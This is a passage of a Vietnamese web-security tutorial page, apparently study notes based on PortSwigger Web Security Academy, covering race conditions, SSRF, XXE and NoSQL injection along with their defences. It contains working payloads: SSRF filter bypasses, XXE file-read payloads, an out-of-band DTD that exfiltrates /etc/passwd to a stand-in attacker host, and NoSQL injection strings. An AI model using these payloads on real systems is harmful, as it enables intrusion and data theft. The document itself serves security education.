          - text: đầu tiên benchmark bằng
          - emphasis [ref=e1818]: Send group in sequence (separate connections)
          - text: . Sau đó gửi song song bằng single-packet attack. Bất kỳ sai lệch nào so với benchmark đều là manh mối, kể cả hiệu ứng bậc hai như nội dung email khác đi hay hành vi ứng dụng thay đổi về sau.
        - listitem [ref=e1819]:
          - strong [ref=e1820]: "Prove (chứng minh):"
          - text: hiểu chuyện gì đang xảy ra, bỏ bớt request thừa, đảm bảo tái hiện được. Hãy coi race condition là một điểm yếu cấu trúc chứ không phải lỗi đơn lẻ.
      - heading "Multi-endpoint race conditions" [level=4] [ref=e1821]
      - paragraph [ref=e1822]:
        - text: Gửi request tới
        - strong [ref=e1823]: nhiều endpoint khác nhau
        - text: "cùng lúc. Ví dụ: thanh toán đơn hàng, và trong race window giữa lúc kiểm tra thanh toán và lúc xác nhận đơn, thêm hàng vào giỏ."
      - paragraph [ref=e1824]: "Vấn đề là race window của các endpoint khó trùng nhau, do:"
      - list [ref=e1825]:
        - listitem [ref=e1826]:
          - strong [ref=e1827]: Độ trễ của kiến trúc mạng
          - text: ", ví dụ front-end mở kết nối mới tới back-end."
        - listitem [ref=e1828]:
          - strong [ref=e1829]: Độ trễ xử lý riêng của từng endpoint.
      - paragraph [ref=e1830]: "Cách khắc phục:"
      - list [ref=e1831]:
        - listitem [ref=e1832]:
          - strong [ref=e1833]: "Connection warming:"
          - text: thêm request vô hại (như
          - code [ref=e1834]: GET /
          - text: ) vào đầu nhóm và gửi
          - emphasis [ref=e1835]: in sequence (single connection)
          - text: . Nếu chỉ request đầu chậm còn các request sau đều nhanh, có thể bỏ qua độ trễ đó.
        - listitem [ref=e1836]:
          - strong [ref=e1837]: "Lạm dụng rate/resource limit:"
          - text: gửi thật nhiều request rác để server tự làm chậm việc xử lý. Cách này tạo được độ trễ phía server mà vẫn dùng được single-packet attack. Ngược lại, thêm delay phía client sẽ phải tách request ra nhiều gói TCP, nên mất tác dụng của single-packet.
      - heading "Single-endpoint race conditions" [level=4] [ref=e1838]
      - paragraph [ref=e1839]:
        - text: Gửi song song tới
        - strong [ref=e1840]: cùng một endpoint
        - text: "với giá trị khác nhau. Ví dụ reset password lưu user ID và token trong session. Gửi hai request reset cùng session, một cho attacker và một cho victim:"
      - paragraph [ref=e1841]:
        - img "Collision in a password reset mechanism" [ref=e1842]
        - emphasis [ref=e1843]:
          - text: "Nguồn:"
          - link "PortSwigger Web Security Academy" [ref=e1844] [cursor=pointer]:
            - /url: https://portswigger.net/web-security/race-conditions
      - paragraph [ref=e1845]:
        - text: "Trạng thái cuối:"
        - code [ref=e1846]: session['reset-user'] = victim
        - text: ","
        - code [ref=e1847]: session['reset-token'] = 1234
        - text: . Session chứa ID của victim nhưng token hợp lệ lại được gửi cho attacker.
      - paragraph [ref=e1848]: Các thao tác liên quan đến email (xác nhận email…) là mục tiêu tốt, vì email thường được gửi ở background thread sau khi đã trả response.
      - heading "Các dạng khác" [level=4] [ref=e1849]
      - list [ref=e1850]:
        - listitem [ref=e1851]:
          - strong [ref=e1852]: "Session-based locking:"
          - text: một số framework (như session handler của PHP) chỉ xử lý một request mỗi session tại một thời điểm, che mất lỗ hổng. Nếu thấy request bị xử lý tuần tự, hãy dùng
          - strong [ref=e1853]: session token khác nhau
          - text: cho mỗi request.
        - listitem [ref=e1854]:
          - strong [ref=e1855]: "Partial construction:"
          - text: object được tạo qua nhiều bước, ví dụ tạo user rồi mới set API key bằng một câu SQL khác. Trong khoảnh khắc API key chưa được khởi tạo (rỗng/
          - code [ref=e1856]: "null"
          - text: "), attacker gửi giá trị khớp với giá trị chưa khởi tạo đó:"
          - list [ref=e1857]:
            - listitem [ref=e1858]:
              - text: "PHP:"
              - code [ref=e1859]: param[]=foo
              - text: →
              - code [ref=e1860]: "['foo']"
              - text: ;
              - code [ref=e1861]: param[]
              - text: →
              - code [ref=e1862]: "[]"
            - listitem [ref=e1863]:
              - text: "Rails:"
              - code [ref=e1864]: param[key]
              - text: →
              - code [ref=e1865]: "{\"param\"=>{\"key\"=>nil}}"
          - generic [ref=e1867]:
            - code [ref=e1869]:
              - generic [ref=e1870]: GET /api/user/info?user=victim&api-key[]= HTTP/2
              - generic [ref=e1872]: "Host: vulnerable-website.com"
            - button [ref=e1874] [cursor=pointer]
        - listitem [ref=e1878]:
          - strong [ref=e1879]: "Time-sensitive attacks:"
          - text: token được sinh từ timestamp thay vì chuỗi ngẫu nhiên an toàn. Gửi hai request reset password cho hai user vào cùng một thời điểm thì cả hai nhận
          - strong [ref=e1880]: cùng token
          - text: .
      - heading "Phòng chống" [level=4] [ref=e1881]
      - paragraph [ref=e1882]: "Loại bỏ sub-state khỏi mọi endpoint nhạy cảm:"
      - list [ref=e1883]:
        - listitem [ref=e1884]: Không trộn dữ liệu từ nhiều nơi lưu trữ khác nhau.
        - listitem [ref=e1885]:
          - text: Thay đổi trạng thái phải
          - strong [ref=e1886]: atomic
          - text: ", dùng tính năng concurrency của datastore. Ví dụ dùng một transaction để vừa kiểm tra thanh toán khớp giỏ hàng vừa xác nhận đơn."
        - listitem [ref=e1887]: "Defense-in-depth: dùng các ràng buộc toàn vẹn như unique constraint trên cột."
        - listitem [ref=e1888]: Không dùng tầng lưu trữ này để bảo vệ tầng khác. Ví dụ session không phù hợp để chặn limit overrun trên DB.
        - listitem [ref=e1889]: Session framework phải giữ session nhất quán. Cập nhật từng biến session riêng lẻ thay vì cập nhật theo batch là rất nguy hiểm. Điều này cũng đúng với ORM.
        - listitem [ref=e1890]: Có thể bỏ hẳn state phía server và đẩy state sang client bằng mã hoá (như JWT), nhưng cách này có rủi ro riêng.
      - heading "Server-side request forgery (SSRF)" [level=3] [ref=e1891]
      - paragraph [ref=e1892]:
        - img "SSRF" [ref=e1893]
        - emphasis [ref=e1894]:
          - text: "Nguồn:"
          - link "PortSwigger Web Security Academy" [ref=e1895] [cursor=pointer]:
            - /url: https://portswigger.net/web-security/ssrf
      - heading "Khái niệm" [level=4] [ref=e1896]
      - paragraph [ref=e1897]:
        - text: SSRF cho phép attacker
        - strong [ref=e1898]: khiến ứng dụng phía server gửi request tới một địa chỉ ngoài ý muốn
        - text: . Thường là tới các service chỉ dùng nội bộ, đôi khi là tới hệ thống bên ngoài bất kỳ. Hậu quả có thể là lộ dữ liệu nhạy cảm như credential.
      - paragraph [ref=e1899]:
        - strong [ref=e1900]: "Tác động:"
        - text: truy cập dữ liệu hoặc thực hiện hành động trái phép trên ứng dụng hoặc các back-end mà nó kết nối tới, có khi dẫn đến chạy lệnh tuỳ ý. Nếu SSRF tới hệ thống bên thứ ba, cuộc tấn công sẽ trông như xuất phát từ tổ chức đang chạy ứng dụng.
      - heading "Khai thác" [level=4] [ref=e1901]
      - paragraph [ref=e1902]:
        - strong [ref=e1903]: 1. SSRF tấn công chính server (loopback)
      - paragraph [ref=e1904]: "Ứng dụng kiểm tra tồn kho bằng cách truyền URL của back-end API:"
      - generic [ref=e1906]:
        - code [ref=e1908]:
          - generic [ref=e1909]: POST /product/stock HTTP/1.0
          - generic [ref=e1911]: "Content-Type: application/x-www-form-urlencoded"
          - generic [ref=e1913]: "Content-Length: 118"
          - generic [ref=e1916]: stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
        - button [ref=e1918] [cursor=pointer]
      - paragraph [ref=e1922]: "Attacker sửa thành:"
      - generic [ref=e1924]:
        - code [ref=e1926]:
          - generic [ref=e1927]: stockApi=http://localhost/admin
        - button [ref=e1929] [cursor=pointer]
      - paragraph [ref=e1933]:
        - text: Request tới
        - code [ref=e1934]: /admin
        - text: xuất phát từ máy local nên
        - strong [ref=e1935]: access control bị bypass
        - text: ". Ứng dụng tin request từ local vì:"
      - list [ref=e1936]:
        - listitem [ref=e1937]: Kiểm tra quyền nằm ở một component đứng trước app server. Kết nối ngược về server thì đi vòng qua nó.
        - listitem [ref=e1938]: Cho phép truy cập admin không cần login từ local để phục vụ khôi phục sự cố.
        - listitem [ref=e1939]: Giao diện admin lắng nghe trên một port khác mà user không truy cập trực tiếp được.
      - paragraph [ref=e1940]:
        - strong [ref=e1941]: 2. SSRF tấn công các back-end khác
      - paragraph [ref=e1942]:
        - text: Back-end dùng IP private không route được ra ngoài, được bảo vệ bằng topology mạng nên thường
        - strong [ref=e1943]: bảo mật yếu hơn
        - text: ", nhiều khi không cần xác thực:"
      - generic [ref=e1945]:
        - code [ref=e1947]:
          - generic [ref=e1948]: stockApi=http://192.168.0.68/admin
        - button [ref=e1950] [cursor=pointer]
      - heading "Bypass các biện pháp phòng thủ" [level=4] [ref=e1954]
      - paragraph [ref=e1955]:
        - strong [ref=e1956]: Blacklist
        - text: (chặn
        - code [ref=e1957]: 127.0.0.1
        - text: ","
        - code [ref=e1958]: localhost
        - text: ","
        - code [ref=e1959]: /admin
        - text: "):"
      - list [ref=e1960]:
        - listitem [ref=e1961]:
          - text: "Biểu diễn IP khác:"
          - code [ref=e1962]: "2130706433"
          - text: ","
          - code [ref=e1963]: "017700000001"
          - text: ","
          - code [ref=e1964]: "127.1"
          - text: .
        - listitem [ref=e1965]:
          - text: Đăng ký domain trỏ về
          - code [ref=e1966]: 127.0.0.1
          - text: (ví dụ
          - code [ref=e1967]: spoofed.burpcollaborator.net
          - text: ).
        - listitem [ref=e1968]:
          - text: URL encode hoặc đổi hoa/thường chuỗi bị chặn (ví dụ
          - code [ref=e1969]: /%61dmin
          - text: ","
          - code [ref=e1970]: /ADMIN
          - text: ).
        - listitem [ref=e1971]:
          - text: Dùng URL do mình kiểm soát để
          - strong [ref=e1972]: redirect
          - text: tới target. Thử nhiều mã redirect và đổi protocol (ví dụ chuyển từ
          - code [ref=e1973]: "http:"
          - text: sang
          - code [ref=e1974]: "https:"
          - text: khi redirect).
      - paragraph [ref=e1975]:
        - strong [ref=e1976]: "Whitelist:"
        - text: "lợi dụng sự không nhất quán khi parse URL:"
      - generic [ref=e1978]:
        - code [ref=e1980]:
          - generic [ref=e1981]: "https://expected-host:fakepassword@evil-host # credential trước @"
          - generic [ref=e1983]: "https://evil-host#expected-host # fragment"
          - generic [ref=e1985]: "https://expected-host.evil-host # DNS hierarchy"
        - button [ref=e1987] [cursor=pointer]
      - list [ref=e1991]:
        - listitem [ref=e1992]: URL encode, double encode ký tự để làm rối code parse. Hiệu quả khi code filter và code gửi request xử lý encoding khác nhau.
        - listitem [ref=e1993]:
          - text: Kết hợp nhiều kỹ thuật, ví dụ
          - code [ref=e1994]: http://localhost:80%2523@stock.weliketoshop.net/admin
          - text: .
      - paragraph [ref=e1995]:
        - strong [ref=e1996]: "Qua open redirect:"
        - text: domain được whitelist có lỗi open redirect, ví dụ
        - code [ref=e1997]: /product/nextProduct?currentProductId=6&path=http://evil-user.net
        - text: ". Nếu API gửi request có follow redirect:"
      - generic [ref=e1999]:
        - code [ref=e2001]:
          - generic [ref=e2002]: stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
        - button [ref=e2004] [cursor=pointer]
      - paragraph [ref=e2008]: Ứng dụng thấy URL thuộc domain hợp lệ nên cho qua, sau đó bị redirect tới địa chỉ nội bộ.
      - heading "Blind SSRF" [level=4] [ref=e2009]
      - paragraph [ref=e2010]:
        - text: Ứng dụng có gửi request tới URL được cung cấp nhưng
        - strong [ref=e2011]: không trả response của back-end về
        - text: cho user. Tác động thường thấp hơn vì chỉ có một chiều, nhưng vẫn có thể dẫn tới RCE.
      - list [ref=e2012]:
        - listitem [ref=e2013]:
          - strong [ref=e2014]: "Phát hiện:"
          - text: dùng OAST (Burp Collaborator). Có HTTP request đến tức là có lỗ hổng. Nếu chỉ thấy DNS lookup mà không có HTTP request, thường là do HTTP ra ngoài bị chặn ở tầng mạng, còn DNS thì được phép.
        - listitem [ref=e2015]:
          - strong [ref=e2016]: "Khai thác:"
          - list [ref=e2017]:
            - listitem [ref=e2018]:
              - text: Quét mù dải IP nội bộ bằng payload phát hiện lỗ hổng đã biết, kết hợp OAST để nhận kết quả (ví dụ Shellshock qua
              - code [ref=e2019]: User-Agent
              - text: ).
            - listitem [ref=e2020]: Cho ứng dụng kết nối tới server của attacker và trả về response độc hại, khai thác lỗ hổng trong HTTP client của server.
      - heading "Tìm attack surface ẩn" [level=4] [ref=e2021]
      - list [ref=e2022]:
        - listitem [ref=e2023]:
          - strong [ref=e2024]: "URL không đầy đủ trong request:"
          - text: chỉ có hostname hoặc một phần path, server ghép thành URL đầy đủ. Khả năng khai thác hạn chế hơn.
        - listitem [ref=e2025]:
          - strong [ref=e2026]: "URL trong định dạng dữ liệu:"
          - text: ví dụ XML. Parser có thể tải URL, dẫn tới SSRF qua XXE.
        - listitem [ref=e2027]:
          - strong [ref=e2028]:
            - text: Header
            - code [ref=e2029]: Referer
            - text: ":"
          - text: phần mềm analytics phía server thường truy cập URL trong
          - code [ref=e2030]: Referer
          - text: để phân tích trang giới thiệu.
      - heading "Phòng chống" [level=4] [ref=e2031]
      - paragraph [ref=e2032]:
        - emphasis [ref=e2033]: (PortSwigger không có mục riêng. Đây là các biện pháp phổ biến.)
      - list [ref=e2034]:
        - listitem [ref=e2035]:
          - text: Dùng whitelist domain/IP được phép, và validate
          - strong [ref=e2036]: sau khi
          - text: đã resolve DNS (chống DNS rebinding).
        - listitem [ref=e2037]: Không follow redirect, hoặc validate lại sau mỗi lần redirect.
        - listitem [ref=e2038]:
          - text: Chặn truy cập tới dải IP nội bộ và loopback, cùng các endpoint metadata của cloud (
          - code [ref=e2039]: 169.254.169.254
          - text: ).
        - listitem [ref=e2040]: Không trả response thô của back-end cho user.
        - listitem [ref=e2041]: Phân tách mạng, và xác thực cả các service nội bộ thay vì tin tưởng ngầm.
      - heading "XML external entity (XXE) injection" [level=3] [ref=e2042]
      - paragraph [ref=e2043]:
        - img "XXE injection" [ref=e2044]
        - emphasis [ref=e2045]:
          - text: "Nguồn:"
          - link "PortSwigger Web Security Academy" [ref=e2046] [cursor=pointer]:
            - /url: https://portswigger.net/web-security/xxe
      - heading "Khái niệm" [level=4] [ref=e2047]
      - paragraph [ref=e2048]:
        - text: XXE cho phép attacker can thiệp vào quá trình
        - strong [ref=e2049]: xử lý dữ liệu XML
        - text: của ứng dụng. Thường dùng để đọc file trên server và tương tác với các hệ thống back-end hoặc bên ngoài mà ứng dụng truy cập được. Có thể leo thang thành SSRF.
      - paragraph [ref=e2050]:
        - strong [ref=e2051]: "Kiến thức XML cần nắm:"
      - list [ref=e2052]:
        - listitem [ref=e2053]:
          - strong [ref=e2054]: "Entity:"
          - text: cách biểu diễn dữ liệu, ví dụ
          - code [ref=e2055]: "&lt;"
          - text: và
          - code [ref=e2056]: "&gt;"
          - text: thay cho
          - code [ref=e2057]: <
          - text: và
          - code [ref=e2058]: ">"
          - text: .
        - listitem [ref=e2059]:
          - strong [ref=e2060]: "DTD (Document Type Definition):"
          - text: khai báo trong phần tử
          - code [ref=e2061]: DOCTYPE
          - text: ", định nghĩa cấu trúc tài liệu. Có loại internal, external, hoặc kết hợp."
        - listitem [ref=e2062]:
          - strong [ref=e2063]: "Custom entity:"
          - code [ref=e2064]: <!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
          - text: . Mọi chỗ dùng
          - code [ref=e2065]: "&myentity;"
          - text: sẽ được thay bằng giá trị đã định nghĩa.
        - listitem [ref=e2066]:
          - strong [ref=e2067]: "External entity:"
          - text: giá trị được tải từ bên ngoài bằng từ khoá
          - code [ref=e2068]: SYSTEM
          - text: và một URL, hỗ trợ cả
          - code [ref=e2069]: file://
          - text: ":"
          - generic [ref=e2071]:
            - code [ref=e2073]:
              - generic [ref=e2074]: <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
              - generic [ref=e2076]: <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
            - button [ref=e2078] [cursor=pointer]
      - paragraph [ref=e2082]:
        - strong [ref=e2083]: "Nguyên nhân:"
        - text: đặc tả XML có nhiều tính năng nguy hiểm, và parser chuẩn hỗ trợ chúng
        - strong [ref=e2084]: kể cả khi ứng dụng không dùng đến
        - text: .
      - heading "Khai thác" [level=4] [ref=e2085]
      - paragraph [ref=e2086]:
        - strong [ref=e2087]: 1. Đọc file
      - paragraph [ref=e2088]:
        - text: Cần thêm
        - code [ref=e2089]: DOCTYPE
        - text: "định nghĩa external entity, rồi dùng entity đó trong một giá trị được trả về trong response:"
      - generic [ref=e2091]:
        - code [ref=e2093]:
          - generic [ref=e2094]: <?xml version="1.0" encoding="UTF-8"?>
          - generic [ref=e2096]: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
          - generic [ref=e2098]: <stockCheck><productId>&xxe;</productId></stockCheck>
        - button [ref=e2100] [cursor=pointer]
      - paragraph [ref=e2104]: "Response:"
      - generic [ref=e2106]:
        - code [ref=e2108]:
          - generic [ref=e2109]: "Invalid product ID: root:x:0:0:root:/root:/bin/bash"
          - generic [ref=e2111]: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
          - generic [ref=e2113]: ...
        - button [ref=e2115] [cursor=pointer]
      - blockquote [ref=e2119]:
        - paragraph [ref=e2120]:
          - text: Trên thực tế XML có nhiều node. Hãy thử entity ở
          - strong [ref=e2121]: từng node
          - text: để xem node nào được phản hồi lại.
      - paragraph [ref=e2122]:
        - strong [ref=e2123]: 2. XXE dẫn tới SSRF
      - generic [ref=e2125]:
        - code [ref=e2127]:
          - generic [ref=e2128]: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
        - button [ref=e2130] [cursor=pointer]
      - paragraph [ref=e2134]:
        - text: Nếu giá trị được trả về trong response thì có tương tác hai chiều. Nếu không thì chỉ là blind SSRF. Ví dụ điển hình là đọc metadata cloud tại
        - code [ref=e2135]: http://169.254.169.254/
        - text: .
      - heading "Blind XXE" [level=4] [ref=e2136]
      - paragraph [ref=e2137]: Ứng dụng không trả giá trị của entity trong response.
      - paragraph [ref=e2138]:
        - strong [ref=e2139]: "Phát hiện bằng OAST:"
      - generic [ref=e2141]:
        - code [ref=e2143]:
          - generic [ref=e2144]: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
        - button [ref=e2146] [cursor=pointer]
      - paragraph [ref=e2150]:
        - text: Nếu entity thường bị chặn, dùng
        - strong [ref=e2151]: parameter entity
        - text: (khai báo bằng
        - code [ref=e2152]: "%"
        - text: "và chỉ dùng được bên trong DTD):"
      - generic [ref=e2154]:
        - code [ref=e2156]:
          - generic [ref=e2157]: <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
        - button [ref=e2159] [cursor=pointer]
      - paragraph [ref=e2163]:
        - strong [ref=e2164]: Exfiltrate dữ liệu out-of-band bằng DTD độc hại
        - text: đặt trên server của attacker (
        - code [ref=e2165]: http://web-attacker.com/malicious.dtd
        - text: "):"
      - generic [ref=e2167]:
        - code [ref=e2169]:
          - generic [ref=e2170]: <!ENTITY % file SYSTEM "file:///etc/passwd">
          - generic [ref=e2172]: <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
          - generic [ref=e2174]: "%eval;"
          - generic [ref=e2176]: "%exfiltrate;"
        - button [ref=e2178] [cursor=pointer]
      - paragraph [ref=e2182]: "Payload gửi tới ứng dụng:"
      - generic [ref=e2184]:
        - code [ref=e2186]:
          - generic [ref=e2187]: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
        - button [ref=e2189] [cursor=pointer]
      - blockquote [ref=e2193]:
        - paragraph [ref=e2194]:
          - text: Nội dung có ký tự xuống dòng (như
          - code [ref=e2195]: /etc/passwd
          - text: ) có thể không gửi được qua URL HTTP. Khi đó thử FTP, hoặc nhắm file một dòng như
          - code [ref=e2196]: /etc/hostname
          - text: .
      - paragraph [ref=e2197]:
        - strong [ref=e2198]: "Lấy dữ liệu qua error message:"
        - text: "đưa nội dung file vào tên của một file không tồn tại:"
      - generic [ref=e2200]:
        - code [ref=e2202]:
          - generic [ref=e2203]: <!ENTITY % file SYSTEM "file:///etc/passwd">
          - generic [ref=e2205]: <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
          - generic [ref=e2207]: "%eval;"
          - generic [ref=e2209]: "%error;"
        - button [ref=e2211] [cursor=pointer]
      - generic [ref=e2216]:
        - code [ref=e2218]:
          - generic [ref=e2219]: "java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash ..."
        - button [ref=e2221] [cursor=pointer]
      - paragraph [ref=e2225]:
        - strong [ref=e2226]: "Tận dụng DTD có sẵn trên server (khi out-of-band bị chặn):"
      - paragraph [ref=e2227]:
        - text: Đặc tả XML không cho dùng parameter entity bên trong định nghĩa của parameter entity khác trong
        - emphasis [ref=e2228]: internal
        - text: DTD. Tuy nhiên, khi DTD là hỗn hợp, internal DTD được phép
        - strong [ref=e2229]: định nghĩa lại
        - text: "entity đã khai báo trong external DTD, và khi đó hạn chế này được nới lỏng. Attacker gọi một file DTD có sẵn trên server và định nghĩa lại một entity của nó:"
      - generic [ref=e2231]:
        - code [ref=e2233]:
          - generic [ref=e2234]: <!DOCTYPE foo [
          - generic [ref=e2236]: <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
          - generic [ref=e2238]: <!ENTITY % custom_entity '
          - generic [ref=e2240]: <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
          - generic [ref=e2242]: <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
          - generic [ref=e2244]: "&#x25;eval;"
          - generic [ref=e2246]: "&#x25;error;"
          - generic [ref=e2248]: "'>"
          - generic [ref=e2250]: "%local_dtd;"
          - generic [ref=e2252]: "]>"
        - button [ref=e2254] [cursor=pointer]
      - paragraph [ref=e2258]:
        - text: Tìm file DTD có sẵn bằng cách thử load và quan sát lỗi. Ví dụ hệ thống dùng GNOME thường có
        - code [ref=e2259]: /usr/share/yelp/dtd/docbookx.dtd
        - text: ":"
      - generic [ref=e2261]:
        - code [ref=e2263]:
          - generic [ref=e2264]: <!DOCTYPE foo [
          - generic [ref=e2266]: <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
          - generic [ref=e2268]: "%local_dtd;"
          - generic [ref=e2270]: "]>"
        - button [ref=e2272] [cursor=pointer]
      - heading "Attack surface ẩn" [level=4] [ref=e2276]
      - list [ref=e2277]:
        - listitem [ref=e2278]:
          - strong [ref=e2279]: "XInclude:"
          - text: khi input của user được nhúng vào một tài liệu XML phía server (ví dụ SOAP request), attacker không kiểm soát được
          - code [ref=e2280]: DOCTYPE
          - text: ", nhưng vẫn chèn được XInclude vào bất kỳ giá trị nào:"
          - generic [ref=e2282]:
            - code [ref=e2284]:
              - generic [ref=e2285]: <foo xmlns:xi="http://www.w3.org/2001/XInclude">
              - generic [ref=e2287]: <xi:include parse="text" href="file:///etc/passwd"/></foo>
            - button [ref=e2289] [cursor=pointer]
        - listitem [ref=e2293]:
          - strong [ref=e2294]: "Upload file:"
          - text: DOCX, SVG là định dạng dựa trên XML. Thư viện xử lý ảnh có thể hỗ trợ SVG kể cả khi ứng dụng chỉ mong đợi PNG/JPEG.
        - listitem [ref=e2295]:
          - strong [ref=e2296]: "Đổi content type:"
          - text: "nhiều endpoint chấp nhận XML dù form gửi dạng urlencoded:"
          - generic [ref=e2298]:
            - code [ref=e2300]:
              - generic [ref=e2301]: POST /action HTTP/1.0
              - generic [ref=e2303]: "Content-Type: text/xml"
              - generic [ref=e2305]: "Content-Length: 52"
              - generic [ref=e2308]: <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
            - button [ref=e2310] [cursor=pointer]
      - heading "Cách test" [level=4] [ref=e2314]
      - list [ref=e2315]:
        - listitem [ref=e2316]: Định nghĩa entity trỏ tới một file OS phổ biến và dùng trong dữ liệu được phản hồi.
        - listitem [ref=e2317]: Định nghĩa entity trỏ tới URL do mình kiểm soát (Burp Collaborator) để phát hiện blind XXE.
        - listitem [ref=e2318]: Thử XInclude với input không phải XML.
        - listitem [ref=e2319]: XML chỉ là định dạng truyền dữ liệu, nên hãy test cả XSS, SQLi… trong đó. Có thể dùng XML escape để obfuscate payload.
      - heading "Phòng chống" [level=4] [ref=e2320]
      - paragraph [ref=e2321]:
        - text: Hầu hết XXE xuất phát từ việc parser hỗ trợ tính năng mà ứng dụng không cần. Cách đơn giản và hiệu quả nhất là
        - strong [ref=e2322]: tắt những tính năng đó
        - text: ":"
      - list [ref=e2323]:
        - listitem [ref=e2324]: Tắt resolve external entity (disable external entities / DTD).
        - listitem [ref=e2325]:
          - text: Tắt hỗ trợ
          - code [ref=e2326]: XInclude
          - text: .
      - paragraph [ref=e2327]: Thường có thể làm qua tuỳ chọn cấu hình hoặc ghi đè hành vi mặc định của thư viện parse XML. Xem tài liệu của thư viện/API tương ứng để biết cách tắt.
      - heading "NoSQL injection" [level=3] [ref=e2328]
      - paragraph [ref=e2329]:
        - img "NoSQL injection" [ref=e2330]
        - emphasis [ref=e2331]:
          - text: "Nguồn:"
          - link "PortSwigger Web Security Academy" [ref=e2332] [cursor=pointer]:
            - /url: https://portswigger.net/web-security/nosql-injection
      - heading "Khái niệm" [level=4] [ref=e2333]
      - paragraph [ref=e2334]:
        - text: NoSQL injection cho phép attacker can thiệp vào query mà ứng dụng gửi tới
        - strong [ref=e2335]: database NoSQL
        - text: ". Hậu quả: bypass xác thực, đọc/sửa dữ liệu, DoS, hoặc chạy code trên server."
      - paragraph [ref=e2336]:
        - text: "NoSQL database lưu dữ liệu không theo bảng quan hệ SQL, dùng nhiều ngôn ngữ truy vấn khác nhau (không có chuẩn chung như SQL), ít ràng buộc quan hệ hơn. Các mô hình chính:"
        - emphasis [ref=e2337]: document store
        - text: (MongoDB, Couchbase),
        - emphasis [ref=e2338]: key-value
        - text: (Redis, DynamoDB),
        - emphasis [ref=e2339]: wide-column
        - text: (Cassandra, HBase),
        - emphasis [ref=e2340]: graph
        - text: (Neo4j, Neptune). Phần dưới tập trung vào
        - strong [ref=e2341]: MongoDB
        - text: (phổ biến nhất).
      - paragraph [ref=e2342]:
        - strong [ref=e2343]: "Hai loại:"
      - list [ref=e2344]:
        - listitem [ref=e2345]:
          - strong [ref=e2346]: "Syntax injection:"
          - text: phá vỡ cú pháp query để chèn payload (giống SQLi về phương pháp).
        - listitem [ref=e2347]:
          - strong [ref=e2348]: "Operator injection:"
          - text: dùng các toán tử của NoSQL để thao túng query.
      - heading "Syntax injection" [level=4] [ref=e2349]
      - paragraph [ref=e2350]:
        - text: "Truy vấn gốc trên MongoDB:"
        - code [ref=e2351]: this.category == 'fizzy'
        - text: .
      - paragraph [ref=e2352]:
        - strong [ref=e2353]: "Phát hiện bằng fuzz string:"
      - generic [ref=e2355]:
        - code [ref=e2357]:
          - generic [ref=e2358]: "'\"`{ ;$Foo} $Foo \\xYZ"
        - button [ref=e2360] [cursor=pointer]
      - paragraph [ref=e2364]:
        - text: "URL-encoded:"
        - code [ref=e2365]: category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
        - text: ". Nếu inject qua JSON thì dùng:"
        - code [ref=e2366]: "'\\\""
        - text: "{\\r;"
        - generic [ref=e2367]: "Foo}\\n"
        - text: "Foo \\xYZ\\u0000`."
      - paragraph [ref=e2368]:
        - strong [ref=e2369]: "Xác định ký tự bị xử lý như cú pháp:"
        - text: gửi
        - code [ref=e2370]: "'"
        - text: →
        - code [ref=e2371]: this.category == '''
        - text: (gây lỗi). Xác nhận bằng cách escape
        - code [ref=e2372]: \'
        - text: → nếu hết lỗi thì có khả năng bị injection.
      - paragraph [ref=e2373]:
        - strong [ref=e2374]: "Xác nhận ảnh hưởng điều kiện boolean:"
        - text: "gửi một điều kiện sai và một điều kiện đúng:"
      - generic [ref=e2376]:
        - code [ref=e2378]:
          - generic [ref=e2379]: category=fizzy' && 0 && 'x (false)
          - generic [ref=e2381]: category=fizzy' && 1 && 'x (true)
        - button [ref=e2383] [cursor=pointer]
      - paragraph [ref=e2387]:
        - strong [ref=e2388]: "Ghi đè điều kiện có sẵn:"
      - generic [ref=e2390]:
        - code [ref=e2392]:
          - generic [ref=e2393]: category=fizzy'||'1'=='1 → this.category == 'fizzy'||'1'=='1' (trả về mọi sản phẩm)
        - button [ref=e2395] [cursor=pointer]
      - paragraph [ref=e2399]:
        - text: Hoặc dùng
        - strong [ref=e2400]: null byte
        - text: để MongoDB bỏ qua mọi ký tự phía sau (loại bỏ điều kiện
        - code [ref=e2401]: this.released == 1
        - text: "):"
      - generic [ref=e2403]:
        - code [ref=e2405]:
          - generic [ref=e2406]: category=fizzy'%00 → this.category == 'fizzy'\u0000' && this.released == 1
        - button [ref=e2408] [cursor=pointer]
      - blockquote [ref=e2412]:
        - paragraph [ref=e2413]: "⚠️ Cẩn thận với điều kiện luôn đúng: nếu cùng dữ liệu được dùng trong câu update/delete, có thể mất dữ liệu ngoài ý muốn."
      - heading "Operator injection" [level=4] [ref=e2414]
      - paragraph [ref=e2415]: "Các toán tử MongoDB thường gặp:"
      - list [ref=e2416]:
        - listitem [ref=e2417]:
          - code [ref=e2418]: $where
          - text: — khớp document thoả mãn một biểu thức JavaScript.
        - listitem [ref=e2419]:
          - code [ref=e2420]: $ne
          - text: — khác giá trị chỉ định.
        - listitem [ref=e2421]:
          - code [ref=e2422]: $in
